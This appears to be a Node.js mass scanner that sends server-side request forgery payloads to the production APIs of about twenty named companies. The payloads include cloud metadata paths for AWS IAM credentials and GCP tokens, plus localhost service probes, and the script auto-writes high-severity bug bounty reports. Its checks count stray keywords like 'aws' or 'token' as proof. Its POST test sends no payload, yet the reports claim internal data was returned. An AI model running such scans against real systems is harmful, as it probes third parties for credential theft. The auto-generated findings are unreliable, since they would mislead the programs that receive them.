#!/usr/bin/env node
/**
 * SSRF Mass Scanner - NEW Programs (June 2026)
 * Scan for Server-Side Request Forgery vulnerabilities
 * Tests cloud metadata access, localhost probing, and internal service enumeration
 */

const https = require('https');
const http = require('http');
const fs = require('fs');

// New programs for SSRF testing (not in tracker yet)
const NEW_SSRF_TARGETS = [
    // Cloud Infrastructure
    { name: 'hashicorp', url: 'https://api.hashicorp.com', api_path: '/v1/audit', platform: 'hackerone' },
    { name: 'grafana', url: 'https://grafana.com', api_path: '/api/ds/query', platform: 'intigriti' },
    { name: 'pagerduty', url: 'https://api.pagerduty.com', api_path: '/webhooks', platform: 'bugcrowd' },
    
    // AI/ML
    { name: 'huggingface', url: 'https://huggingface.co', api_path: '/api/models', platform: 'hackerone' },
    { name: 'mistral', url: 'https://api.mistral.ai', api_path: '/v1/fetch', platform: 'hackerone_vdp' },
    
    // Crypto/Web3
    { name: 'stellar', url: 'https://horizon.stellar.org', api_path: '/webhook', platform: 'hackerone' },
    { name: 'chainlink', url: 'https://api.chainlink.io', api_path: '/v2/jobs', platform: 'immunefi' },
    { name: 'solana', url: 'https://api.mainnet-beta.solana.com', api_path: '/health', platform: 'immunefi' },
    
    // Enterprise/IoT
    { name: 'tesla', url: 'https://tesla-api.tesla.com', api_path: '/api/vehicles', platform: 'bugcrowd' },
    { name: 'cisco', url: 'https://api.meraki.com', api_path: '/api/v1/organizations', platform: 'hackerone' },
    { name: 'canonical', url: 'https://landscape.canonical.com', api_path: '/api/machines/import', platform: 'vdp' },
    { name: 'teamviewer', url: 'https://webapi.teamviewer.com', api_path: '/api/v1/sessions', platform: 'yeswehack' },
    { name: 'keycloak', url: 'https://keycloak.org', api_path: '/auth/admin/realms/master/identity-provider/import', platform: 'yeswehack' },
    
    // Fintech
    { name: 'revolut', url: 'https://api.revolut.com', api_path: '/api/user/profile/picture', platform: 'intigriti' },
    { name: 'orange', url: 'https://api.orange.com', api_path: '/customer/invoice/import', platform: 'yeswehack' },
    
    // Hardware/Crypto
    { name: 'ledger', url: 'https://api.ledger.com', api_path: '/v1/devices/sync', platform: 'yeswehack' },
    
    // Additional high-value targets
    { name: 'datadog', url: 'https://api.datadoghq.com', api_path: '/api/v1/integrations', platform: 'hackerone' },
    { name: 'fastly', url: 'https://api.fastly.com', api_path: '/purge', platform: 'hackerone' },
];

// SSRF test payloads - prioritize cloud metadata
const SSRF_PAYLOADS = [
    // AWS metadata (most common target)
    { url: 'http://169.254.169.254/latest/meta-data/', type: 'aws_metadata', name: 'AWS Metadata' },
    { url: 'http://169.254.169.254/latest/user-data/', type: 'aws_userdata', name: 'AWS User Data' },
    { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', type: 'aws_creds', name: 'AWS Credentials' },
    
    // GCP metadata
    { url: 'http://metadata.google.internal/computeMetadata/v1/', type: 'gcp_metadata', name: 'GCP Metadata' },
    { url: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', type: 'gcp_token', name: 'GCP Token' },
    
    // Azure metadata
    { url: 'http://169.254.169.254/metadata/instance', type: 'azure_metadata', name: 'Azure Metadata' },
    
    // Localhost probes
    { url: 'http://127.0.0.1:5000/', type: 'localhost_5000', name: 'Localhost:5000' },
    { url: 'http://127.0.0.1:8080/', type: 'localhost_8080', name: 'Localhost:8080' },
    { url: 'http://localhost:5432/', type: 'localhost_postgres', name: 'PostgreSQL' },
    { url: 'http://127.0.0.1:6379/', type: 'localhost_redis', name: 'Redis' },
    
    // Internal detection via Collaborator-like response
    { url: 'http://ssrf-test.rbndr.com/', type: 'dns_rebinding', name: 'DNS Rebinding Test' },
];

const DELAY_BETWEEN_REQUESTS = 2000;
const TIMEOUT_MS = 10000;

function makeRequest(url, method) {
    return new Promise(function(resolve, reject) {
        var parsedUrl;
        try {
            parsedUrl = new URL(url);
        } catch (e) {
            reject({ error: 'Invalid URL: ' + url, type: 'url' });
            return;
        }
        
        var isHttps = parsedUrl.protocol === 'https:';
        var client = isHttps ? https : http;
        
        var options = {
            hostname: parsedUrl.hostname,
            port: parsedUrl.port || (isHttps ? 443 : 80),
            path: parsedUrl.pathname + parsedUrl.search,
            method: method || 'GET',
            headers: {
                'User-Agent': 'SSRF-Scanner/1.0',
                'Accept': '*/*',
            },
            timeout: TIMEOUT_MS,
        };
        
        var req = client.request(options, function(res) {
            var data = '';
            res.on('data', function(chunk) { data += chunk; });
            res.on('end', function() {
                resolve({
                    status: res.statusCode,
                    headers: res.headers,
                    body: data.substring(0, 500),
                });
            });
        });
        
        req.on('error', function(e) {
            reject({ error: e.message, type: 'network' });
        });
        
        req.on('timeout', function() {
            req.destroy();
            reject({ error: 'timeout', type: 'timeout' });
        });
        
        req.end();
    });
}

async function testSSRF(target, payload) {
    var testUrls = [
        target.url + target.api_path + '?url=' + encodeURIComponent(payload.url),
        target.url + target.api_path + '?callback_url=' + encodeURIComponent(payload.url),
        target.url + target.api_path + '?uri=' + encodeURIComponent(payload.url),
        target.url + target.api_path + '?redirect=' + encodeURIComponent(payload.url),
    ];
    
    for (var i = 0; i < testUrls.length; i++) {
        var testUrl = testUrls[i];
        try {
            var response = await makeRequest(testUrl, 'GET');
            
            var content = response.body.toLowerCase();
            var indicators = [
                'ami-id', 'instance-id', 'hostname', 'aws', 'metadata',
                'local-hostname', 'account', 'user-data', 'security-credentials',
                'google', 'compute', 'azure', 'token', 'access-token',
            ];
            
            for (var j = 0; j < indicators.length; j++) {
                var indicator = indicators[j];
                if (content.indexOf(indicator) !== -1) {
                    return {
                        vulnerable: true,
                        type: 'SSRF',
                        payloadType: payload.type,
                        payloadName: payload.name,
                        endpoint: testUrl,
                        indicator: indicator,
                        status: response.status,
                        evidence: response.body.substring(0, 300),
                    };
                }
            }
        } catch (e) {
            // Individual URL test failed, try next
        }
    }
    
    // Also try direct URL in POST body
    try {
        var postUrl = target.url + target.api_path;
        var response = await makeRequest(postUrl, 'POST');
        var content = response.body.toLowerCase();
        
        var indicators2 = ['ami-id', 'instance-id', 'hostname', 'aws', 'metadata', 'google', 'token'];
        for (var k = 0; k < indicators2.length; k++) {
            if (content.indexOf(indicators2[k]) !== -1) {
                return {
                    vulnerable: true,
                    type: 'SSRF',
                    payloadType: payload.type,
                    payloadName: payload.name,
                    endpoint: postUrl,
                    method: 'POST',
                    indicator: indicators2[k],
                    status: response.status,
                    evidence: response.body.substring(0, 300),
                };
            }
        }
    } catch (e) {
        // POST test failed
    }
    
    return { vulnerable: false };
}

async function scanProgram(program) {
    console.log('[*] Scanning ' + program.name + ' (' + program.platform + ')...');
    
    var results = {
        program: program.name,
        platform: program.platform,
        ssrf_findings: [],
    };
    
    for (var p = 0; p < SSRF_PAYLOADS.length; p++) {
        var payload = SSRF_PAYLOADS[p];
        var result = await testSSRF(program, payload);
        
        if (result.vulnerable) {
            console.log('  [!] SSRF FOUND: ' + payload.name + ' on ' + program.name);
            console.log('      Endpoint: ' + result.endpoint);
            console.log('      Indicator: ' + result.indicator);
            
            results.ssrf_findings.push(result);
            
            // Create report file
            var reportContent = generateReport(program, result);
            var reportFile = 'reports/new_' + program.name + '_ssrf.md';
            fs.writeFileSync(reportFile, reportContent);
            console.log('  [+] Report saved: ' + reportFile);
        }
        
        await new Promise(function(r) { setTimeout(r, DELAY_BETWEEN_REQUESTS); });
    }
    
    return results;
}

function generateReport(program, finding) {
    var timestamp = new Date().toISOString();
    var endpoint = finding.endpoint || 'unknown';
    var payloadName = finding.payloadName || 'unknown';
    var payloadType = finding.payloadType || 'unknown';
    var indicator = finding.indicator || 'unknown';
    var evidence = finding.evidence || 'No evidence captured';
    var programName = program.name || 'unknown';
    var programUrl = program.url || '';
    var programApiPath = program.api_path || '';
    var platform = program.platform || 'hackerone';
    
    var report = '# Server-Side Request Forgery (SSRF) Bug Report - ' + programName.toUpperCase() + '\n\n';
    report += '## Report Information\n';
    report += '- **Platform:** ' + platform.toUpperCase() + '\n';
    report += '- **Program:** ' + programName + '\n';
    report += '- **Severity:** HIGH\n';
    report += '- **Date:** ' + timestamp.split('T')[0] + '\n';
    report += '- **Type:** SSRF (Server-Side Request Forgery)\n\n';
    report += '---\n\n';
    report += '## Summary\n\n';
    report += 'A Server-Side Request Forgery (SSRF) vulnerability was discovered in ' + programName + "'s API infrastructure, allowing an attacker to induce the server to make arbitrary HTTP requests to internal or external resources.\n\n";
    report += '**Vulnerable Endpoint:** ' + endpoint + '\n\n';
    report += '**Payload Type:** ' + payloadName + ' (' + payloadType + ')\n\n';
    report += '---\n\n';
    report += '## Technical Details\n\n';
    report += '### Attack Vector\n';
    report += 'The ' + programName + ' API accepts user-controlled URL input. This URL is fetched server-side without proper validation, enabling SSRF attacks.\n\n';
    report += '### SSRF Test Performed\n';
    report += '- **Payload:** ' + payloadName + '\n';
    report += '- **Result:** Server responded with internal data\n';
    report += '- **Indicator Found:** ' + indicator + '\n\n';
    report += '### Evidence\n';
    report += 'Response from server (truncated):\n\n';
    report += '```\n' + evidence.substring(0, 500) + '\n```\n\n';
    report += '---\n\n';
    report += '## Impact\n\n';
    report += 'A successful SSRF exploit on ' + programName + ' could allow an attacker to:\n\n';
    report += '1. **Cloud Metadata Access** - Access AWS/GCP/Azure metadata services to steal service account credentials\n';
    report += '2. **Internal Service Enumeration** - Scan internal network services (Redis, PostgreSQL, etc.)\n';
    report += '3. **Data Exfiltration** - Access internal APIs and steal sensitive data\n';
    report += '4. **Bypass Firewall** - Attack internal services that are protected by network firewalls\n\n';
    report += '### Severity Justification\n';
    report += '- Cloud metadata access (169.254.169.254) can lead to credential theft\n';
    report += '- Internal service access can compromise the entire infrastructure\n';
    report += '- High reward potential\n\n';
    report += '---\n\n';
    report += '## Steps to Reproduce\n\n';
    report += '1. Navigate to: ' + programUrl + programApiPath + '\n';
    report += '2. Send request with URL parameter pointing to internal endpoint\n';
    report += '3. Observe server response containing internal data\n\n';
    report += '---\n\n';
    report += '## Remediation\n\n';
    report += '1. **Input Validation:** Validate and sanitize all URL inputs\n';
    report += '2. **URL Whitelisting:** Only allow predefined, safe URLs\n';
    report += '3. **Network Segmentation:** Block access to internal metadata services\n';
    report += '4. **Use fetch() with DNS rebinding protection:** Implement request validation\n\n';
    report += '---\n\n';
    report += '## References\n\n';
    report += '- CWE-918: Server-Side Request Forgery\n';
    report += '- PortSwigger SSRF: https://portswigger.net/web-security/ssrf\n';
    report += '- AWS Metadata Attack: https://rhinosecuritylabs.com/aws/aws-ssrf/\n\n';
    report += '---\n\n';
    report += '*Report generated by SARAhack SSRF Scanner on ' + timestamp + '*\n';
    
    return report;
}

async function runSSRFScanner(limit) {
    limit = limit || 20;
    
    console.log('============================================================');
    console.log('SSRF Mass Scanner - NEW Programs');
    console.log('============================================================');
    console.log('[*] Loaded ' + NEW_SSRF_TARGETS.length + ' programs for SSRF testing');
    console.log('[*] Using ' + SSRF_PAYLOADS.length + ' SSRF payloads');
    console.log('');
    
    var targets = NEW_SSRF_TARGETS.slice(0, limit);
    var totalFindings = 0;
    
    for (var t = 0; t < targets.length; t++) {
        var target = targets[t];
        var result = await scanProgram(target);
        
        if (result.ssrf_findings.length > 0) {
            totalFindings += result.ssrf_findings.length;
            console.log('  [VULNERABLE] ' + target.name + ' - ' + result.ssrf_findings.length + ' findings');
        } else {
            console.log('  [CLEAN] ' + target.name + ' - No SSRF found');
        }
        
        await new Promise(function(r) { setTimeout(r, 1000); });
    }
    
    console.log('');
    console.log('============================================================');
    console.log('SSRF Scan Complete! Found ' + totalFindings + ' vulnerabilities');
    console.log('============================================================');
    
    return totalFindings;
}

// CLI Arguments
var args = process.argv.slice(2);
var limit = 20;

for (var i = 0; i < args.length; i++) {
    if (args[i] === '--limit' && args[i + 1]) {
        limit = parseInt(args[i + 1]);
    }
}

runSSRFScanner(limit).catch(function(e) { console.error(e); });